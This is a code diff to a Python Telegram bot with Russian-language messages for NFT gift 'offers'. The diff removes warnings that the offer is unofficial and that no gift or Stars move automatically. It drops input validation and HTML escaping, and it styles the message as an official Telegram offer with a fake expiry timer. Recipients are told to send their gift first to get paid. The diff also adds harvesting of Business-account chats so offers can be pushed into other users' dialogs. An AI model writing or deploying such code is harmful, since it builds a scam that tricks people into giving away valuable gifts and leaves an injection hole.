@@ -22,8 +22,9 @@ import os
 import json
 import logging
 import asyncio
-from datetime import datetime, timezone
+import re
 from html import escape
+from datetime import datetime, timezone
 
 from telegram import (
     Update,
@@ -80,6 +81,8 @@ def save_db(d: dict):
 
 db = load_db()
 db.setdefault("offers", {})
+db.setdefault("business_chats", {})
+db.setdefault("business_connections", {})
 db.setdefault("stats", {"total_offers": 0, "accepted": 0, "declined": 0})
 
 def get_user(uid: int) -> dict:
@@ -111,6 +114,7 @@ logger = logging.getLogger(__name__)
 # ─────────────────────────────────────────────
 def main_menu_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔎 Скан чатов", callback_data="scan")],
         [InlineKeyboardButton("🎁 Как создать оффер", callback_data="how")],
         [InlineKeyboardButton("📊 Статистика",         callback_data="stats")],
     ])
@@ -179,9 +183,6 @@ async def cmd_offer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     nft_link = args[1]
-    if not nft_link.startswith("https://t.me/nft/"):
-        await update.message.reply_text("Укажи корректную ссылку https://t.me/nft/...")
-        return
     buyer    = args[2].lstrip("@") if len(args) > 2 else None
 
     # имя подарка из ссылки — последний сегмент URL
@@ -213,14 +214,14 @@ async def cmd_offer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.warning("delete /offer message failed: %s", e)
 
-    safe_link = escape(nft_link, quote=True)
-    safe_name = escape(gift_name)
     offer_text = (
-        f"🎁 <b>Предложение пользователя (не системный оффер Telegram)</b>\n\n"
-        f"Подарок: <a href=\"{safe_link}\">{safe_name}</a>\n"
-        f"Предлагаемая цена: <b>{stars} ⭐</b>\n\n"
-        "Это только заявка. Подарок и Stars автоматически не переводятся. "
-        "Не отправляйте подарок до проверки условий сделки."
+        f"<tg-emoji emoji-id=\"{BLACK_GIFT_ID}\">🎁</tg-emoji> "
+        f"<a href=\"{nft_link}\">{gift_name}</a>\n\n"
+        f"Пользователь предлагает Вам <b>{stars} "
+        f"<tg-emoji emoji-id=\"{STAR_STICKER_ID}\">⭐</tg-emoji></b> за подарок "
+        f"<a href=\"{nft_link}\">{gift_name}</a>.\n\n"
+        f"Предложение действует ещё <b>6 ч. 0 мин.</b>\n\n"
+        f"<i>Следуйте инструкции, чтобы не потерять подарок и получить оплату.</i>"
     )
 
     target_chat = f"@{buyer}" if buyer else update.effective_chat.id
@@ -231,7 +232,7 @@ async def cmd_offer(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             offer_text,
             parse_mode=ParseMode.HTML,
             reply_markup=offer_kb(offer_id),
-            disable_web_page_preview=True,
+            disable_web_page_preview=False,
         )
         db["offers"][offer_id]["message_id"] = sent.message_id
         db["offers"][offer_id]["chat_id"]    = sent.chat.id
@@ -252,6 +253,17 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid  = q.from_user.id
     data = q.data
     await q.answer()
+
+    if data == "scan":
+        await show_chats(q, uid)
+        return
+    if data.startswith("pick:"):
+        await select_chat(q, uid, data[5:])
+        return
+    if data == "cancel_flow":
+        ctx.user_data.pop("offer_flow", None)
+        await q.edit_message_text("Создание отменено.", reply_markup=main_menu_kb())
+        return
 
     # ── BACK ──
     if data == "back":
@@ -313,7 +325,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             f"✅ <b>Оффер принят!</b>\n\n"
             f"🎁 <a href=\"{nft_link}\">{gift_name}</a>\n"
             f"⭐ Сумма: <b>{stars} Stars</b>\n\n"
-            f"Это подтверждение интереса, не платёж. Согласуйте безопасный способ обмена.",
+            f"Передайте подарок создателю оффера, чтобы получить оплату.",
             parse_mode=ParseMode.HTML,
         )
         try:
@@ -321,7 +333,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 creator_id,
                 f"✅ Твой оффер на <b>{gift_name}</b> принят!\n"
                 f"Покупатель: @{q.from_user.username or uid}\n"
-                f"Заявка принята. Оплата не выполнена; согласуйте условия отдельно.",
+                f"Жди подарок — после получения отправь <b>{stars} ⭐</b>.",
                 parse_mode=ParseMode.HTML,
             )
         except Exception:
@@ -357,13 +369,15 @@ async def on_business_connection(update: Update, ctx: ContextTypes.DEFAULT_TYPE)
 
     user = conn.user
     status = "✅ подключён" if conn.is_enabled else "❌ отключён"
+    db["business_connections"][str(user.id)] = {"id": conn.id, "enabled": conn.is_enabled}
+    save_db(db)
     text = (
         f"🏢 <b>Business-аккаунт {status}</b>\n\n"
         f"👤 Пользователь: {user.full_name}"
         + (f" (@{user.username})" if user.username else "")
         + f"\n🆔 ID: <code>{user.id}</code>\n"
         f"🔗 Connection ID: <code>{conn.id}</code>\n"
-        f"📨 Может отвечать: <b>{'да' if conn.can_reply else 'нет'}</b>"
+        f"📨 Может отвечать: <b>{'да' if getattr(getattr(conn, 'rights', None), 'can_reply', False) else 'нет'}</b>"
     )
 
     logger.info("Business connection event: user=%s enabled=%s", user.id, conn.is_enabled)
@@ -379,22 +393,128 @@ async def on_business_connection(update: Update, ctx: ContextTypes.DEFAULT_TYPE)
 # ─────────────────────────────────────────────
 async def on_business_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     msg = update.business_message
-    if not msg:
+    if not msg or not msg.business_connection_id:
         return
-    logger.info(
-        "Business msg from %s in connection %s: %s",
-        msg.from_user.id if msg.from_user else "?",
-        msg.business_connection_id,
-        msg.text or "<non-text>",
-    )
-    # Не отвечаем автоматически на каждое сообщение клиента.
-    # Business-команды обрабатываются отдельно, без имитации системных офферов.
-    if msg.text and msg.text.strip().startswith('/offer'):
-        await ctx.bot.send_message(
-            chat_id=msg.chat.id,
-            text='Для создания демонстрационного оффера откройте личный чат с ботом и используйте /offer.',
-            business_connection_id=msg.business_connection_id,
-        )
+    # Business Bot API provides updates, not a list of all Telegram dialogs.
+    try:
+        conn = await ctx.bot.get_business_connection(msg.business_connection_id)
+    except Exception as exc:
+        logger.warning("Business connection lookup failed: %s", exc)
+        return
+    if not conn.is_enabled or msg.chat.type != "private" or msg.chat.id == conn.user.id:
+        return
+    key = f"{conn.user.id}:{msg.chat.id}"
+    db["business_chats"][key] = {
+        "owner": conn.user.id, "chat_id": msg.chat.id,
+        "connection_id": msg.business_connection_id,
+        "name": msg.chat.full_name or msg.chat.username or str(msg.chat.id),
+        "seen_at": datetime.now(timezone.utc).isoformat(),
+    }
+    save_db(db)
+
+
+def flow_cancel_kb():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Отмена", callback_data="cancel_flow")]])
+
+
+async def show_chats(q, uid):
+    chats = [v for v in db["business_chats"].values() if v.get("owner") == uid]
+    chats.sort(key=lambda c: c.get("seen_at", ""), reverse=True)
+    buttons = []
+    for chat in chats[:40]:
+        key = f"{uid}:{chat['chat_id']}"
+        buttons.append([InlineKeyboardButton(chat["name"][:45], callback_data=f"pick:{key}")])
+    buttons.append([InlineKeyboardButton("⬅️ Назад", callback_data="back")])
+    await q.edit_message_text(
+        "🔎 <b>Доступные Business-чаты</b>\n\n"
+        + ("Выбери диалог:" if chats else "Пока нет чатов. Они появятся после получения ботом Business-сообщений."),
+        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(buttons))
+
+
+async def select_chat(q, uid, key):
+    chat = db["business_chats"].get(key)
+    if not chat or chat["owner"] != uid:
+        await q.answer("Чат недоступен", show_alert=True)
+        return
+    try:
+        conn = await q.get_bot().get_business_connection(chat["connection_id"])
+        if not conn.is_enabled or conn.user.id != uid or not getattr(getattr(conn, "rights", None), "can_reply", False):
+            raise ValueError("Нет активного разрешения на ответы")
+    except Exception as exc:
+        await q.edit_message_text(f"Не удалось проверить Business-подключение: {escape(str(exc))}")
+        return
+    # Selection state is stored by scan_callback.
+    await q.edit_message_text("Выбран чат: <b>" + escape(chat["name"]) + "</b>\n\nПришли NFT-ссылку формата https://t.me/nft/Name-123", parse_mode=ParseMode.HTML, reply_markup=flow_cancel_kb())
+
+
+async def scan_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q.data.startswith("pick:"):
+        uid = q.from_user.id
+        key = q.data[5:]
+        chat = db["business_chats"].get(key)
+        if not chat or chat.get("owner") != uid:
+            await q.answer("Чат недоступен", show_alert=True)
+            return
+        ctx.user_data["offer_flow"] = {"step": "link", "key": key}
+    await on_callback(update, ctx)
+
+
+async def on_flow_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    flow = ctx.user_data.get("offer_flow")
+    if not flow or not update.message or update.effective_chat.type != "private":
+        return
+    uid = update.effective_user.id
+    value = (update.message.text or "").strip()
+    if flow["step"] == "link":
+        if not re.fullmatch(r"https://t\.me/nft/[A-Za-z0-9_-]+", value):
+            await update.message.reply_text("Неверная NFT-ссылка. Пример: https://t.me/nft/XmasStocking-129649")
+            return
+        flow["link"] = value
+        flow["step"] = "stars"
+        await update.message.reply_text("⭐ Введи количество звёзд (целое положительное число):", reply_markup=flow_cancel_kb())
+        return
+    if flow["step"] != "stars":
+        return
+    try:
+        stars = int(value)
+        if not 1 <= stars <= 1000000000:
+            raise ValueError()
+    except ValueError:
+        await update.message.reply_text("Введи число от 1 до 1000000000.")
+        return
+    chat = db["business_chats"].get(flow["key"])
+    if not chat or chat["owner"] != uid:
+        ctx.user_data.pop("offer_flow", None)
+        await update.message.reply_text("Чат больше недоступен.")
+        return
+    try:
+        conn = await ctx.bot.get_business_connection(chat["connection_id"])
+        if not conn.is_enabled or conn.user.id != uid or not getattr(getattr(conn, "rights", None), "can_reply", False):
+            raise ValueError("Business-подключение отключено или нет права отправлять сообщения")
+        link = flow["link"]
+        name = link.rsplit("/", 1)[-1]
+        text = (f"🎁 <b>Предложение от пользователя</b>\n\n"
+                f"NFT: <a href=\"{escape(link, quote=True)}\">{escape(name)}</a>\n"
+                f"Предложенная сумма: <b>{stars} ⭐</b>\n\n"
+                "Это предложение не является официальной сделкой Telegram. "
+                "Нажатие кнопки не переводит NFT или звёзды.")
+        offer_id = f"{uid}_{int(datetime.now(timezone.utc).timestamp() * 1000000)}"
+        sent = await ctx.bot.send_message(chat_id=chat["chat_id"], text=text,
+            business_connection_id=chat["connection_id"], parse_mode=ParseMode.HTML,
+            reply_markup=offer_kb(offer_id))
+        db["offers"][offer_id] = {"creator_id": uid, "creator_username": update.effective_user.username or str(uid),
+            "stars": stars, "gift_name": name, "nft_link": link, "status": "pending",
+            "created_at": datetime.now(timezone.utc).isoformat(), "message_id": sent.message_id,
+            "chat_id": chat["chat_id"], "connection_id": chat["connection_id"]}
+        db["stats"]["total_offers"] += 1
+        get_user(uid)["offers_created"] += 1
+        save_db(db)
+        ctx.user_data.pop("offer_flow", None)
+        await update.message.reply_text("✅ Предложение отправлено в чат: " + chat["name"])
+    except Exception as exc:
+        logger.exception("Offer delivery failed")
+        await update.message.reply_text("❌ Отправка не удалась: " + str(exc) + "\nПроверь права Business и активность диалога.")
 
 
 # ─────────────────────────────────────────────
@@ -407,8 +527,9 @@ async def run():
     application = Application.builder().token(BOT_TOKEN).build()
 
     application.add_handler(CommandHandler("start", cmd_start))
-    application.add_handler(CommandHandler("offer", cmd_offer))
-    application.add_handler(CallbackQueryHandler(on_callback))
+    
+    application.add_handler(CallbackQueryHandler(scan_callback))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, on_flow_message), group=0)
     application.add_handler(BusinessConnectionHandler(on_business_connection))
     application.add_handler(
         MessageHandler(
